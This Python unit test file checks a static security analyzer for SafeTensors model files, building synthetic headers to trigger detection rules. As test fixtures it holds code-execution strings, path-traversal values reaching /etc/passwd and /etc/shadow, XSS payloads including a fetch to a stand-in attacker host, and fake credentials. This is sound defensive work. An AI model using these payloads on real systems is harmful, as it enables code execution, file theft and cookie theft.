"""
tests/unit/test_safetensors_analyzer.py
=======================================

Regression and unit tests for the Phase 5 SafeTensors static security
analysis implementation.

SAFETY CONTRACT
---------------
- No tensor weights are loaded or deserialized.
- No pickle.loads(), torch.load(), eval(), or exec() is called.
- All fixtures are synthetic byte sequences assembled using struct.pack()
  and json.dumps() only.
- No safetensors or torch packages are imported or required.

Coverage
--------
ST101 — Metadata code-execution string
ST102 — Metadata credential exposure
ST103 — Suspicious URL in metadata
ST104 — Script injection tag in metadata
ST201 — Header size / JSON token DoS
ST202 — Tensor data range overlap
ST203 — Invalid tensor data offsets
ST204 — Invalid tensor dtype
ST205 — Invalid tensor shape
ST206 — Missing required tensor fields
ST207 — Duplicate tensor name
ST208 — Tensor range outside file bounds
ST209 — Truncated or unreadable header

Plus:
- Valid structure (no findings)
- Zero-sized / scalar tensors (valid)
- Multiple tensors (no overlap, all valid)
- Evidence byte offsets
- Severity and confidence levels
- Remediation guidance non-empty
- No dynamic execution in analyzer imports
"""

from __future__ import annotations

import io
import json
import struct
from typing import Any

import pytest

from model_scanner.analyzers.safetensors.analyzer import SafeTensorsAnalyzer
from model_scanner.analyzers.safetensors.header import (
    extract_header_bytes,
    unpack_header_length,
)
from model_scanner.analyzers.safetensors.metadata import scan_metadata
from model_scanner.analyzers.safetensors.tensors import (
    SAFETENSORS_VALID_DTYPES,
    validate_tensors,
)
from model_scanner.analyzers.safetensors.token_guard import scan_json_tokens
from model_scanner.core.exceptions import ResourceLimitError, SafeTensorsAnalysisError
from model_scanner.core.models import (
    Artifact,
    Confidence,
    InputSourceType,
    ModelFormat,
    ScanConfig,
    Severity,
)

# ---------------------------------------------------------------------------
# Fixture helpers
# ---------------------------------------------------------------------------

_ZERO_SHA256 = "0" * 64
_ONE_SHA256 = "1" * 64
_VALID_DTYPES = sorted(SAFETENSORS_VALID_DTYPES)


def _make_safetensors(header_dict: dict[str, Any], data_section: bytes = b"") -> bytes:
    """Build a syntactically valid SafeTensors byte blob from a header dict.

    The function JSON-encodes the dict, prepends the 8-byte LE length prefix,
    and appends the provided data section bytes.
    """
    json_bytes = json.dumps(header_dict).encode("utf-8")
    prefix = struct.pack("<Q", len(json_bytes))
    return prefix + json_bytes + data_section


def _make_artifact(data: bytes, sha256_char: str = "0") -> Artifact:
    """Wrap raw bytes in an Artifact for analyzer.analyze() calls."""
    sha256 = sha256_char * 64
    return Artifact(
        artifact_id="test",
        source_path="<test>",
        input_source=InputSourceType.IN_MEMORY,
        size_bytes=len(data),
        sha256=sha256,
        stream=io.BytesIO(data),
    )


def _rule_ids(findings: Any) -> list[str]:
    return [f.rule_id for f in findings]


# ---------------------------------------------------------------------------
# Valid-structure tests (no findings expected)
# ---------------------------------------------------------------------------


class TestValidStructure:
    """A valid SafeTensors file must produce zero findings."""

    def _valid_header(self, data_size: int = 0) -> dict[str, Any]:
        return {
            "__metadata__": {"format": "pt", "author": "tester"},
            "weight": {
                "dtype": "F32",
                "shape": [2, 4],
                "data_offsets": [0, data_size],
            },
        }

    def test_valid_single_tensor_no_findings(self) -> None:
        data_section = bytes(32)  # 2*4 * 4 bytes (F32)
        data = _make_safetensors(self._valid_header(32), data_section)
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert _rule_ids(findings) == [], f"Expected no findings; got {_rule_ids(findings)}"

    def test_valid_finding_count_is_zero(self) -> None:
        data_section = bytes(32)
        data = _make_safetensors(self._valid_header(32), data_section)
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert len(findings) == 0

    def test_valid_multiple_tensors_no_findings(self) -> None:
        header = {
            "a": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]},
            "b": {"dtype": "I32", "shape": [4], "data_offsets": [16, 32]},
            "c": {"dtype": "BF16", "shape": [8], "data_offsets": [32, 48]},
        }
        data = _make_safetensors(header, bytes(48))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert _rule_ids(findings) == []

    def test_valid_scalar_zero_sized_tensor(self) -> None:
        """Scalar tensors have shape=[] and data_offsets=[N, N] — must be valid."""
        header = {
            "scalar": {"dtype": "F32", "shape": [], "data_offsets": [0, 0]},
        }
        data = _make_safetensors(header, b"")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        # ST203 must NOT fire for start == end (scalar)
        assert "ST203" not in _rule_ids(findings), (
            f"ST203 must not fire for scalar tensor; got {_rule_ids(findings)}"
        )

    def test_valid_no_metadata_key(self) -> None:
        """Header without __metadata__ is valid."""
        header = {
            "w": {"dtype": "F16", "shape": [1, 1], "data_offsets": [0, 2]},
        }
        data = _make_safetensors(header, bytes(2))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert _rule_ids(findings) == []

    def test_valid_all_canonical_dtypes(self) -> None:
        """Every canonical dtype must be accepted without ST204."""
        offset = 0
        tensors: dict[str, Any] = {}
        for dtype in _VALID_DTYPES:
            tensors[f"t_{dtype}"] = {
                "dtype": dtype,
                "shape": [1],
                "data_offsets": [offset, offset + 4],
            }
            offset += 4
        data = _make_safetensors(tensors, bytes(offset))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data, "2"))
        assert "ST204" not in _rule_ids(findings), (
            f"Valid dtypes triggered ST204: {_rule_ids(findings)}"
        )


# ---------------------------------------------------------------------------
# ST209 — Truncated / unreadable header
# ---------------------------------------------------------------------------


class TestST209TruncatedHeader:
    """Tests for ST209: Truncated or Unreadable Header."""

    def test_empty_file_emits_st209(self) -> None:
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(b""))
        assert "ST209" in _rule_ids(findings)

    def test_four_byte_file_emits_st209(self) -> None:
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(b"\x00" * 4))
        assert "ST209" in _rule_ids(findings)

    def test_exactly_8_bytes_zero_length_emits_st209(self) -> None:
        # header_len == 0 → zero is invalid
        data = struct.pack("<Q", 0)
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        # header length of 0 raises SafeTensorsAnalysisError in unpack_header_length
        assert "ST209" in _rule_ids(findings)

    def test_header_len_declared_beyond_file_emits_st209(self) -> None:
        # Claims 1000 bytes of JSON but file only has 8+5 = 13 bytes
        data = struct.pack("<Q", 1000) + b"{    "
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST209" in _rule_ids(findings)

    def test_invalid_json_emits_st209(self) -> None:
        bad_json = b"NOT JSON AT ALL !!!"
        data = struct.pack("<Q", len(bad_json)) + bad_json
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST209" in _rule_ids(findings)

    def test_non_dict_root_json_emits_st209(self) -> None:
        json_bytes = b"[1, 2, 3]"
        data = struct.pack("<Q", len(json_bytes)) + json_bytes
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST209" in _rule_ids(findings)

    def test_st209_severity_is_high(self) -> None:
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(b"short"))
        st209 = [f for f in findings if f.rule_id == "ST209"]
        assert st209, "Expected at least one ST209 finding"
        assert st209[0].severity == Severity.HIGH

    def test_st209_confidence_is_high(self) -> None:
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(b"short"))
        st209 = [f for f in findings if f.rule_id == "ST209"]
        assert st209
        assert st209[0].confidence == Confidence.HIGH

    def test_st209_remediation_not_empty(self) -> None:
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(b"short"))
        st209 = [f for f in findings if f.rule_id == "ST209"]
        assert st209
        assert st209[0].remediation, "Remediation must not be empty"


# ---------------------------------------------------------------------------
# ST201 — Header size / JSON token DoS
# ---------------------------------------------------------------------------


class TestST201DoS:
    """Tests for ST201: Header Size or JSON Token DoS."""

    def test_oversized_header_emits_st201(self) -> None:
        # Declare 2 GB header length — rejected before allocation
        huge_len = 2 * 1024 * 1024 * 1024
        data = struct.pack("<Q", huge_len)
        config = ScanConfig(max_safetensors_header_mb=1)
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data), config)
        assert "ST201" in _rule_ids(findings)

    def test_token_budget_exceeded_emits_st201(self) -> None:
        # Generate a header with more structural tokens than the budget allows
        many_tensors: dict[str, Any] = {}
        offset = 0
        for i in range(200):
            many_tensors[f"t{i}"] = {
                "dtype": "F32",
                "shape": [1],
                "data_offsets": [offset, offset + 4],
            }
            offset += 4
        json_bytes = json.dumps(many_tensors).encode("utf-8")
        data = struct.pack("<Q", len(json_bytes)) + json_bytes + bytes(offset)
        config = ScanConfig(max_json_tokens=10)  # artificially tiny budget
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data), config)
        assert "ST201" in _rule_ids(findings)

    def test_st201_severity_is_high(self) -> None:
        data = struct.pack("<Q", 2 * 1024 * 1024 * 1024)
        config = ScanConfig(max_safetensors_header_mb=1)
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data), config)
        st201 = [f for f in findings if f.rule_id == "ST201"]
        assert st201
        assert st201[0].severity == Severity.HIGH

    def test_st201_remediation_not_empty(self) -> None:
        data = struct.pack("<Q", 2 * 1024 * 1024 * 1024)
        config = ScanConfig(max_safetensors_header_mb=1)
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data), config)
        st201 = [f for f in findings if f.rule_id == "ST201"]
        assert st201
        assert st201[0].remediation


# ---------------------------------------------------------------------------
# ST203 — Invalid tensor data offsets
# ---------------------------------------------------------------------------


class TestST203InvalidOffsets:
    """Tests for ST203: Invalid Tensor Data Offsets."""

    def test_start_greater_than_end_emits_st203(self) -> None:
        header = {"t": {"dtype": "F32", "shape": [1], "data_offsets": [10, 4]}}
        data = _make_safetensors(header, bytes(64))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST203" in _rule_ids(findings)

    def test_negative_start_emits_st203(self) -> None:
        header = {"t": {"dtype": "F32", "shape": [1], "data_offsets": [-1, 4]}}
        data = _make_safetensors(header, bytes(64))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST203" in _rule_ids(findings)

    def test_non_integer_offsets_emits_st203(self) -> None:
        header = {"t": {"dtype": "F32", "shape": [1], "data_offsets": ["a", "b"]}}
        data = _make_safetensors(header, bytes(64))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST203" in _rule_ids(findings)

    def test_single_element_offsets_emits_st203(self) -> None:
        header = {"t": {"dtype": "F32", "shape": [1], "data_offsets": [0]}}
        data = _make_safetensors(header, bytes(64))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST203" in _rule_ids(findings)

    def test_st203_severity_is_high(self) -> None:
        header = {"t": {"dtype": "F32", "shape": [1], "data_offsets": [10, 4]}}
        data = _make_safetensors(header, bytes(64))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        st203 = [f for f in findings if f.rule_id == "ST203"]
        assert st203
        assert st203[0].severity == Severity.HIGH

    def test_st203_confidence_is_high(self) -> None:
        header = {"t": {"dtype": "F32", "shape": [1], "data_offsets": [10, 4]}}
        data = _make_safetensors(header, bytes(64))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        st203 = [f for f in findings if f.rule_id == "ST203"]
        assert st203
        assert st203[0].confidence == Confidence.HIGH


# ---------------------------------------------------------------------------
# ST204 — Invalid tensor dtype
# ---------------------------------------------------------------------------


class TestST204InvalidDtype:
    """Tests for ST204: Invalid Tensor dtype."""

    def test_unknown_dtype_emits_st204(self) -> None:
        header = {"t": {"dtype": "FLOAT999", "shape": [1], "data_offsets": [0, 4]}}
        data = _make_safetensors(header, bytes(4))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST204" in _rule_ids(findings)

    def test_lowercase_dtype_emits_st204(self) -> None:
        """SafeTensors dtypes are uppercase; lowercase must be flagged."""
        header = {"t": {"dtype": "f32", "shape": [1], "data_offsets": [0, 4]}}
        data = _make_safetensors(header, bytes(4))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST204" in _rule_ids(findings)

    def test_integer_dtype_field_emits_st204(self) -> None:
        header = {"t": {"dtype": 32, "shape": [1], "data_offsets": [0, 4]}}
        data = _make_safetensors(header, bytes(4))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST204" in _rule_ids(findings)

    def test_st204_severity_is_medium(self) -> None:
        header = {"t": {"dtype": "BAD", "shape": [1], "data_offsets": [0, 4]}}
        data = _make_safetensors(header, bytes(4))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        st204 = [f for f in findings if f.rule_id == "ST204"]
        assert st204
        assert st204[0].severity == Severity.MEDIUM


# ---------------------------------------------------------------------------
# ST205 — Invalid tensor shape
# ---------------------------------------------------------------------------


class TestST205InvalidShape:
    """Tests for ST205: Invalid Tensor shape."""

    def test_negative_dimension_emits_st205(self) -> None:
        header = {"t": {"dtype": "F32", "shape": [-1, 4], "data_offsets": [0, 4]}}
        data = _make_safetensors(header, bytes(4))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST205" in _rule_ids(findings)

    def test_non_integer_dimension_emits_st205(self) -> None:
        header = {"t": {"dtype": "F32", "shape": [2, "bad"], "data_offsets": [0, 4]}}
        data = _make_safetensors(header, bytes(4))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST205" in _rule_ids(findings)

    def test_string_shape_emits_st205(self) -> None:
        header = {"t": {"dtype": "F32", "shape": "invalid", "data_offsets": [0, 4]}}
        data = _make_safetensors(header, bytes(4))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST205" in _rule_ids(findings)

    def test_st205_severity_is_medium(self) -> None:
        header = {"t": {"dtype": "F32", "shape": [-1], "data_offsets": [0, 4]}}
        data = _make_safetensors(header, bytes(4))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        st205 = [f for f in findings if f.rule_id == "ST205"]
        assert st205
        assert st205[0].severity == Severity.MEDIUM


# ---------------------------------------------------------------------------
# ST206 — Missing required tensor fields
# ---------------------------------------------------------------------------


class TestST206MissingFields:
    """Tests for ST206: Missing Required Tensor Fields."""

    def test_missing_dtype_emits_st206(self) -> None:
        header = {"t": {"shape": [1], "data_offsets": [0, 4]}}
        data = _make_safetensors(header, bytes(4))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST206" in _rule_ids(findings)

    def test_missing_shape_emits_st206(self) -> None:
        header = {"t": {"dtype": "F32", "data_offsets": [0, 4]}}
        data = _make_safetensors(header, bytes(4))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST206" in _rule_ids(findings)

    def test_missing_data_offsets_emits_st206(self) -> None:
        header = {"t": {"dtype": "F32", "shape": [1]}}
        data = _make_safetensors(header, bytes(4))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST206" in _rule_ids(findings)

    def test_non_dict_tensor_entry_emits_st206(self) -> None:
        header = {"t": "this_is_wrong"}
        data = _make_safetensors(header, b"")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST206" in _rule_ids(findings)

    def test_st206_severity_is_high(self) -> None:
        header = {"t": {"shape": [1], "data_offsets": [0, 4]}}
        data = _make_safetensors(header, bytes(4))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        st206 = [f for f in findings if f.rule_id == "ST206"]
        assert st206
        assert st206[0].severity == Severity.HIGH


# ---------------------------------------------------------------------------
# ST208 — Tensor range outside file bounds
# ---------------------------------------------------------------------------


class TestST208OutOfBounds:
    """Tests for ST208: Tensor Range Outside File Bounds."""

    def test_offset_beyond_data_section_emits_st208(self) -> None:
        # data_offsets claims [0, 999] but data section is only 4 bytes
        header = {"t": {"dtype": "F32", "shape": [1], "data_offsets": [0, 999]}}
        data = _make_safetensors(header, bytes(4))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST208" in _rule_ids(findings)

    def test_exact_boundary_is_valid(self) -> None:
        data_section = bytes(16)
        header = {"t": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]}}
        data = _make_safetensors(header, data_section)
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST208" not in _rule_ids(findings)

    def test_st208_severity_is_high(self) -> None:
        header = {"t": {"dtype": "F32", "shape": [1], "data_offsets": [0, 10_000_000]}}
        data = _make_safetensors(header, bytes(4))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        st208 = [f for f in findings if f.rule_id == "ST208"]
        assert st208
        assert st208[0].severity == Severity.HIGH


# ---------------------------------------------------------------------------
# ST202 — Tensor data range overlap
# ---------------------------------------------------------------------------


class TestST202Overlap:
    """Tests for ST202: Tensor Data Range Overlap."""

    def test_overlapping_tensors_emits_st202(self) -> None:
        header = {
            "a": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]},
            "b": {"dtype": "F32", "shape": [4], "data_offsets": [8, 24]},  # overlaps a
        }
        data = _make_safetensors(header, bytes(32))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST202" in _rule_ids(findings)

    def test_non_overlapping_tensors_no_st202(self) -> None:
        header = {
            "a": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]},
            "b": {"dtype": "F32", "shape": [4], "data_offsets": [16, 32]},
        }
        data = _make_safetensors(header, bytes(32))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST202" not in _rule_ids(findings)

    def test_three_way_overlap_emits_st202(self) -> None:
        header = {
            "a": {"dtype": "F32", "shape": [8], "data_offsets": [0, 32]},
            "b": {"dtype": "F32", "shape": [8], "data_offsets": [16, 48]},
            "c": {"dtype": "F32", "shape": [8], "data_offsets": [24, 56]},
        }
        data = _make_safetensors(header, bytes(64))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST202" in _rule_ids(findings)

    def test_st202_severity_is_high(self) -> None:
        header = {
            "a": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]},
            "b": {"dtype": "F32", "shape": [4], "data_offsets": [8, 24]},
        }
        data = _make_safetensors(header, bytes(32))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        st202 = [f for f in findings if f.rule_id == "ST202"]
        assert st202
        assert st202[0].severity == Severity.HIGH


# ---------------------------------------------------------------------------
# ST207 — Duplicate tensor name
# ---------------------------------------------------------------------------


class TestST207DuplicateTensorName:
    """Tests for ST207: Duplicate Tensor Name."""

    def test_duplicate_key_detected_by_token_guard(self) -> None:
        """json.loads() silently keeps the last value for duplicate keys,
        so we rely on the token_guard pre-scan to detect duplicates."""
        guard = scan_json_tokens(
            b'{"a": {"dtype":"F32","shape":[1],"data_offsets":[0,4]},'
            b' "a": {"dtype":"F32","shape":[1],"data_offsets":[4,8]}}',
            max_tokens=10_000,
            max_depth=128,
        )
        assert "a" in guard.duplicate_keys

    def test_no_duplicate_no_st207(self) -> None:
        header = {
            "x": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
            "y": {"dtype": "F32", "shape": [1], "data_offsets": [4, 8]},
        }
        data = _make_safetensors(header, bytes(8))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST207" not in _rule_ids(findings)


# ---------------------------------------------------------------------------
# ST101 — Metadata code execution string
# ---------------------------------------------------------------------------


class TestST101CodeExecution:
    """Tests for ST101: Metadata Code Execution String."""

    @pytest.mark.parametrize(
        "key,value",
        [
            ("cmd", "eval('os.getcwd()')"),
            ("setup", "exec('import subprocess')"),
            ("load_fn", "__import__('os').system('id')"),
            ("init", "os.system('whoami')"),
            ("proc", "subprocess.Popen(['id'])"),
            ("decode", "base64.b64decode('dGVzdA==')"),
        ],
    )
    def test_code_exec_pattern_emits_st101(self, key: str, value: str) -> None:
        header = {
            "__metadata__": {key: value},
            "w": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
        }
        data = _make_safetensors(header, bytes(4))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST101" in _rule_ids(findings), (
            f"Expected ST101 for key={key!r}, value={value!r}; got {_rule_ids(findings)}"
        )

    def test_st101_severity_is_critical(self) -> None:
        header = {"__metadata__": {"x": "eval('1+1')"}}
        data = _make_safetensors(header, b"")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data, "3"))
        st101 = [f for f in findings if f.rule_id == "ST101"]
        assert st101
        assert st101[0].severity == Severity.CRITICAL

    def test_st101_confidence_is_high(self) -> None:
        header = {"__metadata__": {"x": "exec('pass')"}}
        data = _make_safetensors(header, b"")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data, "4"))
        st101 = [f for f in findings if f.rule_id == "ST101"]
        assert st101
        assert st101[0].confidence == Confidence.HIGH

    def test_st101_remediation_not_empty(self) -> None:
        header = {"__metadata__": {"x": "eval('x')"}}
        data = _make_safetensors(header, b"")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data, "5"))
        st101 = [f for f in findings if f.rule_id == "ST101"]
        assert st101
        assert st101[0].remediation

    def test_plain_text_no_st101(self) -> None:
        header = {"__metadata__": {"description": "A ResNet-50 model trained on ImageNet"}}
        data = _make_safetensors(header, b"")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data, "6"))
        assert "ST101" not in _rule_ids(findings)


# ---------------------------------------------------------------------------
# ST102 — Metadata credential exposure
# ---------------------------------------------------------------------------


class TestST102PathTraversal:
    """Tests for ST102: Path Traversal Sequence in Metadata."""

    @pytest.mark.parametrize(
        "key,value",
        [
            ("path", "../../../etc/passwd"),
            ("template", "..\\..\\windows\\system32\\cmd.exe"),
            ("encoded", "%2e%2e%2fetc%2fshadow"),
            ("unix", "/etc/shadow"),
        ],
    )
    def test_path_traversal_emits_st102(self, key: str, value: str) -> None:
        header = {"__metadata__": {key: value}}
        data = _make_safetensors(header, b"")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data, "7"))
        assert "ST102" in _rule_ids(findings), (
            f"Expected ST102 for {key}={value!r}; got {_rule_ids(findings)}"
        )

    def test_st102_severity_is_high(self) -> None:
        header = {"__metadata__": {"path": "../../../etc/passwd"}}
        data = _make_safetensors(header, b"")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data, "8"))
        st102 = [f for f in findings if f.rule_id == "ST102"]
        assert st102
        assert st102[0].severity == Severity.HIGH

    def test_st102_remediation_not_empty(self) -> None:
        header = {"__metadata__": {"path": "../../../etc/passwd"}}
        data = _make_safetensors(header, b"")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data, "9"))
        st102 = [f for f in findings if f.rule_id == "ST102"]
        assert st102
        assert st102[0].remediation


class TestST104CredentialExposure:
    """Tests for ST104: Credential or Secret Exposure in Metadata."""

    @pytest.mark.parametrize(
        "key,value",
        [
            ("aws", "AKIAIOSFODNN7EXAMPLE"),
            ("gh", "ghp_" + "a" * 36),
            ("hf", "hf_" + "b" * 34),
            ("openai", "sk-" + "c" * 48),
            ("pkey", "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBg==\n-----END PRIVATE KEY-----"),
        ],
    )
    def test_credential_pattern_emits_st104(self, key: str, value: str) -> None:
        header = {"__metadata__": {key: value}}
        data = _make_safetensors(header, b"")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data, "d"))
        assert "ST104" in _rule_ids(findings), (
            f"Expected ST104 for {key}={value[:20]!r}; got {_rule_ids(findings)}"
        )

    def test_st104_severity_is_high(self) -> None:
        header = {"__metadata__": {"key": "AKIAIOSFODNN7EXAMPLE"}}
        data = _make_safetensors(header, b"")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data, "e"))
        st104 = [f for f in findings if f.rule_id == "ST104"]
        assert st104
        assert st104[0].severity == Severity.HIGH

    def test_st104_remediation_not_empty(self) -> None:
        header = {"__metadata__": {"key": "AKIAIOSFODNN7EXAMPLE"}}
        data = _make_safetensors(header, b"")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data, "f"))
        st104 = [f for f in findings if f.rule_id == "ST104"]
        assert st104
        assert st104[0].remediation


# ---------------------------------------------------------------------------
# ST103 — Suspicious URL in metadata
# ---------------------------------------------------------------------------


class TestST103SuspiciousURL:
    """Tests for ST103: Suspicious URL in Metadata."""

    def test_http_url_emits_st103(self) -> None:
        header = {"__metadata__": {"source": "http://malicious.example.com/payload"}}
        data = _make_safetensors(header, b"")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data, "a"))
        assert "ST103" in _rule_ids(findings)

    def test_https_url_emits_st103(self) -> None:
        header = {"__metadata__": {"ref": "https://evil.ru/dl?file=weights.bin"}}
        data = _make_safetensors(header, b"")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data, "b"))
        assert "ST103" in _rule_ids(findings)

    def test_st103_severity_is_medium(self) -> None:
        header = {"__metadata__": {"u": "http://x.com/y"}}
        data = _make_safetensors(header, b"")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data, "c"))
        st103 = [f for f in findings if f.rule_id == "ST103"]
        assert st103
        assert st103[0].severity == Severity.MEDIUM

    def test_st103_confidence_is_medium(self) -> None:
        header = {"__metadata__": {"u": "https://example.com"}}
        data = _make_safetensors(header, b"")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data, "d"))
        st103 = [f for f in findings if f.rule_id == "ST103"]
        assert st103
        assert st103[0].confidence == Confidence.MEDIUM


# ---------------------------------------------------------------------------
# ST104 — Script injection tag in metadata
# ---------------------------------------------------------------------------


class TestST105ScriptInjection:
    """Tests for ST105: Script Injection Tag in Metadata."""

    @pytest.mark.parametrize(
        "value",
        [
            "<script>alert('xss')</script>",
            '<iframe src="javascript:alert(1)">',
            'onload=stealCookies()',
            'onerror=fetch("http://attacker.com")',
            "javascript:void(0)",
        ],
    )
    def test_script_tag_emits_st105(self, value: str) -> None:
        header = {"__metadata__": {"html": value}}
        data = _make_safetensors(header, b"")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data, "e"))
        assert "ST105" in _rule_ids(findings), (
            f"Expected ST105 for {value!r}; got {_rule_ids(findings)}"
        )

    def test_plain_html_entity_no_st105(self) -> None:
        header = {"__metadata__": {"note": "Temperature &gt; 0"}}
        data = _make_safetensors(header, b"")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data, "f"))
        assert "ST105" not in _rule_ids(findings)

    def test_st105_severity_is_high(self) -> None:
        header = {"__metadata__": {"h": "<script>alert(1)</script>"}}
        data = _make_safetensors(header, b"")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data, "a"))
        st105 = [f for f in findings if f.rule_id == "ST105"]
        assert st105
        assert st105[0].severity == Severity.HIGH


# ---------------------------------------------------------------------------
# Evidence and byte-offset tests
# ---------------------------------------------------------------------------


class TestEvidenceByteOffsets:
    """All findings must carry coherent Evidence objects."""

    def test_truncated_header_evidence_byte_offset_is_zero(self) -> None:
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(b"\x01"))
        assert findings, "Expected at least one finding"
        assert findings[0].evidence.byte_offset == 0

    def test_structural_finding_evidence_coordinate_space_is_header(self) -> None:
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(b"\x01"))
        for f in findings:
            assert f.evidence.coordinate_space.value == "header", (
                f"Finding {f.rule_id} should have HEADER coordinate space"
            )

    def test_metadata_finding_evidence_has_matched_value(self) -> None:
        header = {"__metadata__": {"x": "eval('danger')"}}
        data = _make_safetensors(header, b"")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data, "b"))
        st101 = [f for f in findings if f.rule_id == "ST101"]
        assert st101
        assert st101[0].evidence.matched_value  # non-empty

    def test_tensor_finding_has_tensor_name_in_matched_value(self) -> None:
        header = {"my_tensor": {"dtype": "F32", "shape": [-1], "data_offsets": [0, 4]}}
        data = _make_safetensors(header, bytes(4))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data, "c"))
        st205 = [f for f in findings if f.rule_id == "ST205"]
        assert st205
        assert "my_tensor" in st205[0].evidence.matched_value

    def test_format_is_safetensors(self) -> None:
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(b"\x01"))
        for f in findings:
            assert f.format == ModelFormat.SAFETENSORS

    def test_artifact_sha256_propagated(self) -> None:
        data = _make_safetensors(
            {"w": {"dtype": "F32", "shape": [-1], "data_offsets": [0, 4]}},
            bytes(4),
        )
        sha256 = "abcdef" + "0" * 58
        art = Artifact(
            artifact_id="t",
            source_path="<test>",
            input_source=InputSourceType.IN_MEMORY,
            size_bytes=len(data),
            sha256=sha256,
            stream=io.BytesIO(data),
        )
        findings = SafeTensorsAnalyzer().analyze(art)
        for f in findings:
            assert f.artifact_sha256 == sha256


# ---------------------------------------------------------------------------
# Unit tests for sub-modules
# ---------------------------------------------------------------------------


class TestHeaderModule:
    """Unit tests for model_scanner.analyzers.safetensors.header."""

    def test_unpack_normal_header_length(self) -> None:
        data = struct.pack("<Q", 100) + b"x" * 100
        length = unpack_header_length(data, max_header_bytes=1024)
        assert length == 100

    def test_too_short_raises_analysis_error(self) -> None:
        with pytest.raises(SafeTensorsAnalysisError, match="too short"):
            unpack_header_length(b"\x01\x02", max_header_bytes=1024)

    def test_zero_length_raises_analysis_error(self) -> None:
        data = struct.pack("<Q", 0)
        with pytest.raises(SafeTensorsAnalysisError, match="zero"):
            unpack_header_length(data, max_header_bytes=1024)

    def test_exceeds_limit_raises_resource_limit_error(self) -> None:
        data = struct.pack("<Q", 2_000_000)
        with pytest.raises(ResourceLimitError, match="exceeds"):
            unpack_header_length(data, max_header_bytes=1_000_000)

    def test_extract_header_bytes_correct(self) -> None:
        json_bytes = b'{"x": 1}'
        data = struct.pack("<Q", len(json_bytes)) + json_bytes + b"DATA"
        extracted = extract_header_bytes(data, len(json_bytes))
        assert extracted == json_bytes

